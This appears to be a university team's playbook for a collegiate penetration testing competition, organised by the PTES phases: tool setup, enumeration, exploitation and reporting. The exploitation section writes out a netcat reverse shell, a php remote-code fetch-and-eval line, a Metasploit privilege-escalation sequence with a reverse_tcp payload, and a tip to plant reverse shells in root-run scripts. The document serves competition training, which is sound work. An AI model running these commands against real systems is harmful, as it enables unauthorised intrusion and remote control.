Penetration Testing Execution Standard (PTES) For National University Team (CPTC Playbook)
PTES defines penetration testing as 7 phases.
1.    Pre-engagement Interactions
2.    Intelligence Gathering
3.    Threat Modeling
4.    Vulnerability Analysis
5.    Exploitation
6.    Post Exploitation
7.	Reporting

(This cheat sheets are also available at Dr. Jaurez playbook, TrueSharkproducts )

Phase 1. Pre-engagement Interactions (15 mins)
Team needs to understand the Environment and general issues what the company is having.
Gather questions, System knowledge, Installation of Tools.

Phase 1.2 Installation of tools (30mins Need to be fully completed )
Command line installation and No User Interface learn each one:  sudo apt-get install 
sudo apt-get update
sudo apt-get install git
sudo apt-get install nmap     
sudo apt-get install mimikatz
sudo apt-get install wireshark
sudo apt-get install metasploit
sudo apt-get install postgresql
sudo apt install postgresql postgresql-contrib
====
Installing ZAP
git clone https://aur.archlinux.org/snapd.git
sudo systemctl enable --now snapd.s
sudo ln -s /var/lib/snapd/snap /snap
sudo snap install zaproxy --classic
=================================================
Metasploit Framework:To download and install metasploit run:

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
./msfconsole
Next steps > ===
service postgresql start 

msfdb init  //to create a database
msfconsole

Phase 2. Intelligence Gathering and Enumeration (Time: 2 hrs )
Intelligence Gathering is the phase where data or "intelligence" is gathered to assist in guiding the assessment actions. At the broadest level this intelligence gathering includes information about employees, facilities, products and plans. Within a larger picture this intelligence will include potentially secret or private "intelligence" of a competitor, or information that is otherwise relevant to the target.

2.Maintaining Access 
·         List client User accounts and Admin 
·         List  client Policies and rules. 
·         SSH Tunneling: https://www.ssh.com/ssh/tunneling/
·         SSH VNC Tunneling:   https://www.cl.cam.ac.uk/research/dtg/attarchive/vnc/sshvnc.html
·         Capture User groups.
·         Perform DNS Zone Transfer	
o	NSlookup and dig on windows command.
3.Data Harvesting and LOGS:()
Enumeration workflow> Extracting information from email ID> bruteforce on directory services > exploiting  SNMP and SMTP. 
Enumerate… Enumerate… Enumerate: check services and ports of interests.

Wget from github (aka upload to git)
Initial Foothold

Notes:

Be careful with fuzzing/dirb/tcp-syn if IDS/IPS setup. Reduce frequency.
Windows Commands and tools to use.

Other Commands lines need to know: NSlookup, Nbstat to view logged into a computer.

 Phase 3 and 4. Threat Modeling, Vulnerability Research and Scanning ( Time: Start ASAP Ongoing and reporting - Petra, Omer and Matt)
Team Objective: Team need to create a  System Analysis, Open Hosts and port Scanning, Gather relevant documentation such as CVEs, Information about the vulnerability, Identify assets, Threat communities
Team Task:  Gather information such as port information. Map the network
a.            Ip address and Open port
b.            Services and applications
c.             Gathering Information and check for logs
D.       Create threat modeling,

Phase 5 and 6.  Exploitation, Web and Service, and Post exploitation:(TEAM effort 4- 5hrs) - Service Penetration Testers 
(Rich, Patrick and Jenny) 

Learn this process:  https://www.cybrary.it/0p3n/post-exploitation-techniques/   


Vulnerability Scanning of Web application:
Steps: 
Start with downloading tools: OWASP, SQLMAP, Msfconsole, Msfvenom and Meterpreter.
Metasploit Framework:To download and install metasploit run:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
./msfconsole
Next steps > ===
service postgresql start 
msfdb init  //to create a database
msfconsole

Reference:https://www.hackingtutorials.org/metasploit-tutorials/metasploit-commands/


Use WMAP - This is only when we found the ports and services or use the SQLMap enumeration tool and use this tool as a web vulnerability scanning for reporting

msf > load wmap
How to run the command example:   wmap_sites -a http://172.16.194.172
wmap_vulns -l

Another tool we can web crawl using: OWASP ZAP web crawler
Linux Enumeration: RPCinfo,enum4linux, Session Logs
==================================================
Only if allowed and time permits, generating payloads with:

Inline Payload and Reverse shell:
Reverse shells: https://highon.coffee/blog/reverse-shell-cheat-sheet/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

 Privilege Escalation

If Meterpreter: post/multi/recon/local_exploit_suggester
Privilege Escalation
NOTE: Don’t forget – the first thing you want to do after gaining access to remote system is to escalate your privileges (after migration of course). 
Let’s run one more:
meterpreter > getsystem
…got system (via technique 4).
meterpreter > background
msf exploit(ms10_002_aurora) > use exploit/windows/local/
msf exploit(ms10_002_aurora) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d) > set SESSION 1
msf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms10_015_kitrap0d) > set LHOST [Local host IPadddress]
msf exploit(ms10_015_kitrap0d) > set LPORT 4443
msf exploit(ms10_015_kitrap0d) > show options
msf exploit(ms10_015_kitrap0d) > exploit
meterpreter > getuid
 
===================================================
Other: 
·         TRK: Trinity Rescue kit
·         Directory Traversal Attacks:
o	ACL and Groups
·         Check file and directory permissions: Linux (ls -la)
o	For example, if a file/script on a user's account can be ran as root, see if it can be edited or replaced. Insert a reverse shell line or something else that would be run as root.
·         Pivoting: See if there are other accounts you can gain control of and see what permissions/files they have. The first user may lead to a second which leads to priv. Esc.

Research if priv. esc. Vuln exists and may just require coding (Python!)

Use Msfvenom:
Other things to do:
Things to do:
Open Netcat or Msfconsole = 
nc -e /bin/sh [IPADDR] [PORT]
Example: nc.traditional -e /bin/bash 10.0.0.1 4444
Web delivery exploit:
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set TARGET 1
TARGET => 1
msf exploit(web_delivery) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(web_delivery) > exploit
php -d allow_url_fopen=true -r "eval(file_get_contents('http://WEBIPADDRESS:8080/alK3t3tt'));"

Phase 7. Documentation and Reporting. (Time: Ongoing and 1hr and 30mins till Sunday 3am) - Everyone.

Task: providing detail list of all information gathered during pentest and team must provide a list of vulnerabilities and describe the vulnerabilities.  

Include: (see google drive)
1.Graph and charts.
2.Evidence and Findings, evaluate the issue and reproduce it and fix it. 
3.Creating policy and security recommendations
4. Current CVE
5. Providing security tool
6. Providing list of patch updates.
Include regulatory frameworks such as GLBA, PCI, FinCEN, KYC/AML, The US PATRIOT Act, FINRA, and others
You can use https://draw.io for network diagrams (Basically the Google App version of Visio)
